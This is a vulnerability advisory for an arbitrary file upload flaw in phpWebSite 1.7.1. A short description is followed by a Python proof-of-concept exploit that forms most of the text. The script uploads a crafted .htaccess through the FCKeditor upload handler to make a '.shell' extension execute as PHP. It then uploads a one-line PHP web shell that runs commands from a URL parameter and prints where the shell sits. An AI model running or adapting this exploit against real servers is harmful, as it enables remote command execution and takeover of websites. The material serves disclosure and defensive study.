source: http://www.securityfocus.com/bid/47759/info

phpWebSite is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the webserver process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.

phpWebSite 1.7.1 is vulnerable; other versions may also be affected. 

# ------------------------------------------------------------------------
# Software................phpWebSite 1.7.1
# Vulnerability...........Arbitrary Upload
# Threat Level............Very Critical (5/5)
# Download................http://phpwebsite.appstate.edu/
# Discovery Date..........5/5/2011
# Tested On...............Windows Vista + XAMPP
# ------------------------------------------------------------------------
# Author..................AutoSec Tools
# Site....................http://www.autosectools.com/
# Email...................John Leitch <john@autosectools.com>
# ------------------------------------------------------------------------
# 
# 
# --Description--
# 
# An arbitrary upload vulnerability in phpWebSite 1.7.1 can be exploited
# to upload a PHP shell.
# 
# 
# --PoC--

import socket

host = 'localhost'
path = '/phpwebsite_1_7_1'
shell_path = path + '/javascript/editors/fckeditor/editor/filemanager/upload/phpws/.shell'
port = 80

def upload_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)    

    s.send('POST ' + path + '/javascript/editors/fckeditor/editor/filemanager/upload/phpws/upload.php?local=.htaccess HTTP/1.1\r\n'
           'Host: localhost\r\n'
           'Proxy-Connection: keep-alive\r\n'
           'User-Agent: x\r\n'
           'Content-Length: 223\r\n'
           'Cache-Control: max-age=0\r\n'
           'Origin: null\r\n'
           'Content-Type: multipart/form-data; boundary=----x\r\n'
           'Accept: text/html\r\n'
           'Accept-Encoding: gzip,deflate,sdch\r\n'
           'Accept-Language: en-US,en;q=0.8\r\n'
           'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
           '\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="NewFile"; filename=".htaccess"\r\n'     
           'Content-Type: application/octet-stream\r\n'
           '\r\n'
           'AddType application/x-httpd-php .shell\r\n'
           '\r\n'
           'Action application/x-httpd-php "/php/php.exe"\r\n'
           '------x--\r\n'
           '\r\n')

    resp = s.recv(8192)

    http_ok = 'HTTP/1.1 200 OK'
    
    if http_ok not in resp[:len(http_ok)]:
        print 'error uploading .htaccess'
        return
    else: print '.htaccess uploaded'
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)    

    s.send('POST ' + path + '/javascript/editors/fckeditor/editor/filemanager/upload/phpws/upload.php?local=.htaccess HTTP/1.1\r\n'
           'Host: localhost\r\n'
           'Proxy-Connection: keep-alive\r\n'
           'User-Agent: x\r\n'
           'Content-Length: 163\r\n'
           'Cache-Control: max-age=0\r\n'
           'Origin: null\r\n'
           'Content-Type: multipart/form-data; boundary=----x\r\n'
           'Accept: text/html\r\n'
           'Accept-Encoding: gzip,deflate,sdch\r\n'
           'Accept-Language: en-US,en;q=0.8\r\n'
           'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
           '\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="NewFile"; filename=".shell"\r\n'
           'Content-Type: application/octet-stream\r\n'
           '\r\n'
           '<?php system($_GET["CMD"]); ?>\r\n'
           '------x--\r\n'
           '\r\n')

    resp = s.recv(8192)

    http_ok = 'HTTP/1.1 200 OK'
    
    if http_ok not in resp[:len(http_ok)]:
        print 'error uploading shell'
        return
    else: print 'shell uploaded' 
 

    s.send('GET ' + shell_path + ' HTTP/1.1\r\n'\
           'Host: ' + host + '\r\n\r\n')

    
    print 'shell located at http://' + host + shell_path

upload_shell()